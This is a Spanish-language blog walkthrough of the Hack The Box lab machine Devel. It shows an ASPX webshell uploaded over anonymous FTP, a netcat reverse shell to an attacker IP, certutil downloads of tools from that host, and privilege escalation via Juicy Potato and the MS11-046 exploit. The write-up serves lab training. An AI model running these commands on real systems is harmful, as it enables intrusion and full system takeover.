<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box Devel - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina Devel en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box Devel">
<meta property="og:url" content="http://localhost:4000/htb-devel/">


  <meta property="og:description" content="Resolución de la máquina Devel en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-devel/devel.jpg">





  <meta property="article:published_time" content="2021-11-26T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-devel/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box Devel</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box Devel">
    <meta itemprop="description" content="Resolución de la máquina Devel en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="November 26, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Devel
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021 </time>&emsp;
          
          
        </p>
        <p><img src="/assets/images/htb-devel/banner-devel.jpg" alt="" /></p>

<h2 id="devel">Devel</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.5.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.5
PING 10.10.10.5 <span class="o">(</span>10.10.10.5<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.5: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>146 ms

<span class="nt">---</span> 10.10.10.5 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 145.505/145.505/145.505/0.000 ms

</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.5 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 23:03 CDT
Initiating SYN Stealth Scan at 23:03
Scanning 10.10.10.5 <span class="o">[</span>65535 ports]
Discovered open port 21/tcp on 10.10.10.5
Discovered open port 80/tcp on 10.10.10.5
Completed SYN Stealth Scan at 23:04, 26.43s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.5
Host is up, received user-set <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-08-27 23:03:49 CDT <span class="k">for </span>26s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.59 seconds
           Raw packets sent: 131086 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 20 <span class="o">(</span>880B<span class="o">)</span>

</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.5
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,80
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
   8   │ 

</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,80 10.10.10.5 <span class="nt">-oN</span> targeted
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 23:05 CDT
Nmap scan report <span class="k">for </span>10.10.10.5
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>11.54 seconds
</code></pre></div></div>

<p>A partir de los resultados obtenidos de nmap, observamos que se encuentra abierto el puerto 21 asociado al servicio FTP; por lo que trataremos de establece una conexión con el usuario <em>anonymous</em>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name <span class="o">(</span>10.10.10.5:kamiyo<span class="o">)</span>: anonymous
331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
Password:
230 User logged <span class="k">in</span><span class="nb">.</span>
Remote system <span class="nb">type </span>is Windows_NT.
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp&gt; 
</code></pre></div></div>

<p>De los recursos observados en el servidor FTP, se observan que podrían estár relacionados con el sitio web que hace uso de Microsoft IIS 7.5, por lo que es posible que podamos subir archivo y visualizarlos por la web. Hacemos un archivo de prueba para validar.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn test.htm
&lt;html&gt;
&lt;body&gt;
	&lt;pre&gt;Test&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; put test.htm
<span class="nb">local</span>: test.htm remote: test.htm
200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
226 Transfer complete.
51 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>1.0573 MB/s<span class="o">)</span>
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
08-29-21  12:32AM                   51 test.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp&gt; 
</code></pre></div></div>

<p>Accediendo al recurso http://10.10.10.5/test.htm observamos nuestro código subido, por lo que los archivos que subamos por FTP se encuentran asociados al sitio web. Ahora, sabiendo que IIS maneja archivos de extensión <strong>aspx</strong>, podemos crear un archivo con dicha extensión que nos entable una reverse shell hacia nuestro equipo de atacante. Se podría pensar en generar un archivo PHP; sin embargo, con <code class="language-plaintext highlighter-rouge">whatweb</code> o el plugin <em>wappalyzer</em> no observamos que el servidor nos pueda interpretar código php.</p>

<p><img src="/assets/images/htb-devel/devel-test.png" alt="" /></p>

<p>Primero, buscamos archivo en nuestro sistema que nos puedan ayudar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate webshell | <span class="nb">grep </span>asp
/usr/share/webshells/asp
/usr/share/webshells/asp/cmd-asp-5.1.asp
/usr/share/webshells/asp/cmdasp.asp
/usr/share/webshells/aspx
/usr/share/webshells/aspx/cmdasp.aspx
</code></pre></div></div>

<p>Para este caso utilizaremos el archivo <code class="language-plaintext highlighter-rouge">cmdasp.aspx</code>, por lo que lo subimos al servidor:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; put cmdasp.aspx
<span class="nb">local</span>: cmdasp.aspx remote: cmdasp.aspx
200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
226 Transfer complete.
1442 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>35.2615 MB/s<span class="o">)</span>
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
08-29-21  12:56AM                 1442 cmdasp.aspx
03-17-17  05:37PM                  689 iisstart.htm
08-29-21  12:32AM                   51 test.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp&gt;
</code></pre></div></div>

<p>Abrimos el recurso desde el navegador y observamos nuestra webshell, para validar introducimos los comandos <code class="language-plaintext highlighter-rouge">whoami</code> y <code class="language-plaintext highlighter-rouge">ipconfig</code> para corroborar que nos encontramos en la máquina víctima y tenermos ejecución de comandos a nivel de sistema.</p>

<p><img src="/assets/images/htb-devel/devel-cmdasp.png" alt="" /></p>

<p><img src="/assets/images/htb-devel/devel-cmdasp1.png" alt="" /></p>

<p>Ahora procedemos a entablarnos una reverse shell, primerament subimos el archivo <em>nc.exe</em> para poderlo ejecutar:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; put nc.exe
<span class="nb">local</span>: nc.exe remote: nc.exe
200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
226 Transfer complete.
28306 bytes sent <span class="k">in </span>0.00 secs <span class="o">(</span>39.1228 MB/s<span class="o">)</span>
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful.
125 Data connection already open<span class="p">;</span> Transfer starting.
03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
08-29-21  12:56AM                 1442 cmdasp.aspx
03-17-17  05:37PM                  689 iisstart.htm
08-29-21  01:04AM                28306 nc.exe
08-29-21  12:32AM                   51 test.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp&gt;
</code></pre></div></div>

<p>Después, en nuestra webshell introducimos el siguiente comando para localizar donde se encuentra el archivo <em>nc.exe</em> dentro del sistema <code class="language-plaintext highlighter-rouge">cd C:\ &amp;&amp; dir /s nc.exe</code>. Identificamos que el archivo se encuentran en la ruta <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot</code>. Ahora nos ponemos en escucha por el puerto 443 y nos establecemos una conexión introduciendo el siguiente comando en la webshell <code class="language-plaintext highlighter-rouge">C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.15 443</code></p>

<p><img src="/assets/images/htb-devel/devel-cmdasp2.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.15] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.5] 49157
Microsoft Windows <span class="o">[</span>Version 6.1.7600]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

<span class="nb">whoami
whoami
</span>iis apppool<span class="se">\w</span>eb

c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<p>Tenemos acceso al sistema. Ahora enumeramos un poco la máquina para observa que privilegios tenemos o de que forma escalamos privilegios.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                               State   
<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                      Disabled

C:<span class="se">\U</span>sers&gt;
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 
System Boot Time:          29/8/2021, 1:15:26 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor<span class="o">(</span>s<span class="o">)</span>:              1 Processor<span class="o">(</span>s<span class="o">)</span> Installed.
                           <span class="o">[</span>01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:<span class="se">\W</span>indows
System Directory:          C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32
Boot Device:               <span class="se">\D</span>evice<span class="se">\H</span>arddiskVolume1
System Locale:             el<span class="p">;</span>Greek
Input Locale:              en-us<span class="p">;</span>English <span class="o">(</span>United States<span class="o">)</span>
Time Zone:                 <span class="o">(</span>UTC+02:00<span class="o">)</span> Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.458 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.519 MB
Virtual Memory: In Use:    622 MB
Page File Location<span class="o">(</span>s<span class="o">)</span>:     C:<span class="se">\p</span>agefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix<span class="o">(</span>s<span class="o">)</span>:                 N/A
Network Card<span class="o">(</span>s<span class="o">)</span>:           1 NIC<span class="o">(</span>s<span class="o">)</span> Installed.
                           <span class="o">[</span>01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address<span class="o">(</span>es<span class="o">)</span>
                                 <span class="o">[</span>01]: 10.10.10.5
                                 <span class="o">[</span>02]: fe80::58c0:f1cf:abc6:bb9e
                                 <span class="o">[</span>03]: dead:beef::45f:18cb:2ab3:a6b2
                                 <span class="o">[</span>04]: dead:beef::58c0:f1cf:abc6:bb9e

C:<span class="se">\U</span>sers&gt;
</code></pre></div></div>

<p>Observamos dos vías potenciales para escalar privilegios en el sistema, el usuario presenta habilitado <em>SeImpersonatePrivilege</em> por lo que con la herramienta <a href="https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2">Juicy Potato</a> podemos escalar privilegios.</p>

<p>Nos descargamos el archivo, lo subimos al sistema junto con el archivo <strong>nc.exe</strong> compartiendo un servidor con python y descargandolo en <em>C:\Windows\Temp\Privesc</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.5 - - <span class="o">[</span>28/Aug/2021 17:42:06] <span class="s2">"GET /Juicy.Potato.x86.exe HTTP/1.1"</span> 200 -
10.10.10.5 - - <span class="o">[</span>28/Aug/2021 17:42:09] <span class="s2">"GET /Juicy.Potato.x86.exe HTTP/1.1"</span> 200 -
10.10.10.5 - - <span class="o">[</span>28/Aug/2021 18:02:44] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
10.10.10.5 - - <span class="o">[</span>28/Aug/2021 18:02:47] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp                                                                                                                         
<span class="nb">mkdir </span>Privesc                                                                     
<span class="nb">mkdir </span>Privesc                                                                                                         
<span class="nb">cd </span>Privesc                              
<span class="nb">cd </span>Privesc                                                                                 
certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.15/Juicy.Potato.x86.exe C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\J</span>P.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  040600
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.

certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.15/nc.exe C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\n</span>c.exe
certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.15/nc.exe C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\n</span>c.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  0000  ...
  6e00
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
</code></pre></div></div>

<p>Ejecutamos el archivo <strong>JP.exe</strong>  comprobamos que información nos solicita. De acuerdo con el página de <a href="https://github.com/ivanitlearning/Juicy-Potato-x86">Github</a>, nos muestra un ejemplo de uso; por lo que tomamos dichos valores y agregamos el parámetro <code class="language-plaintext highlighter-rouge">-a</code> para ejecutar nuestro comando; en este caso una reverse shell a nuestro equipo de acatante <code class="language-plaintext highlighter-rouge">-a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.15 443"</code>, por lo que antes de ejcutar el programa nos ponemos en escucha por el puerto 443</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>JP.exe
JP.exe
JuicyPotato v0.1 

Mandatory args: 
<span class="nt">-t</span> createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;<span class="k">*</span><span class="o">&gt;</span> try both
<span class="nt">-p</span> &lt;program&gt;: program to launch
<span class="nt">-l</span> &lt;port&gt;: COM server listen port


Optional args: 
<span class="nt">-m</span> &lt;ip&gt;: COM server listen address <span class="o">(</span>default 127.0.0.1<span class="o">)</span>
<span class="nt">-a</span> &lt;argument&gt;: <span class="nb">command </span>line argument to pass to program <span class="o">(</span>default NULL<span class="o">)</span>
<span class="nt">-k</span> &lt;ip&gt;: RPC server ip address <span class="o">(</span>default 127.0.0.1<span class="o">)</span>
<span class="nt">-n</span> &lt;port&gt;: RPC server listen port <span class="o">(</span>default 135<span class="o">)</span>
<span class="nt">-c</span> &lt;<span class="o">{</span>clsid<span class="o">}&gt;</span>: CLSID <span class="o">(</span>default BITS:<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">})</span>
<span class="nt">-z</span> only <span class="nb">test </span>CLSID and print token<span class="s1">'s user

C:\Windows\Temp\Privesc&gt;
JP.exe -l 4444 -p c:\windows\system32\cmd.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9} -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.15 443"
Testing {6d18ad12-bde3-4393-b311-099c346e6df9} 4444
......
[+] authresult 0
{6d18ad12-bde3-4393-b311-099c346e6df9};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Windows\Temp\Privesc&gt;
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.15] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.5] 49183
Microsoft Windows <span class="o">[</span>Version 6.1.7600]
Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.

<span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>Ya somos adminstradores del sistema, ahora podemos visualizar las flags (user.txt y root.txt).</p>

<p>Otra forma de escalar privilegios es que vemos que la máquina presenta el sistema operativo <em>Microsoft Windows 7 Enterprise 6.1.7600 N/A Build 7600</em>, dicha versión de tecnología presenta una vulnerabilidad descrita en el CVE <em>CVE-2011-1249</em> relacionado al <em>MS11-046</em>; por lo que podemos buscar un exploit compilado que nos facilite la escalada de privilegios:</p>

<p><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe">Github</a></p>

<p>Nos descargamos el archivo, lo subimos al sistema compartiendo un servidor con python y descargandolo en <em>C:\Windows\Temp\Privesc</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.5 - - <span class="o">[</span>28/Aug/2021 17:28:22] <span class="s2">"GET /ms11-046.exe HTTP/1.1"</span> 200 -
10.10.10.5 - - <span class="o">[</span>28/Aug/2021 17:28:26] <span class="s2">"GET /ms11-046.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp                                                                                                                         
<span class="nb">mkdir </span>Privesc                                                                     
<span class="nb">mkdir </span>Privesc                                                                                                         
<span class="nb">cd </span>Privesc                              
<span class="nb">cd </span>Privesc                                                                                 
certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.15/ms11-046.exe C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\m</span>s11-046.exe
<span class="k">****</span>  Online  <span class="k">****</span>
  000000  ...
  01b8af
CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.

<span class="nb">dir
dir
 </span>Volume <span class="k">in </span>drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc

29/08/2021  01:33     &lt;DIR&gt;          <span class="nb">.</span>
29/08/2021  01:33     &lt;DIR&gt;          ..
29/08/2021  01:33            112.815 ms11-046.exe
               1 File<span class="o">(</span>s<span class="o">)</span>        112.815 bytes
               2 Dir<span class="o">(</span>s<span class="o">)</span>  22.117.363.712 bytes free

C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
</code></pre></div></div>

<p>Ejecutamos el archivo ms11-046.exe y ya somos adminstradores del sistema, ahora podemos visualizar las flags (user.txt y root.txt).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ms11-046.exe

<span class="nb">whoami
whoami
</span>nt authority<span class="se">\s</span>ystem

c:<span class="se">\W</span>indows<span class="se">\S</span>ystem32&gt;
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#arbitrary-file-upload" class="page__taxonomy-item" rel="tag">Arbitrary_File_ Upload</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ftp" class="page__taxonomy-item" rel="tag">FTP</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
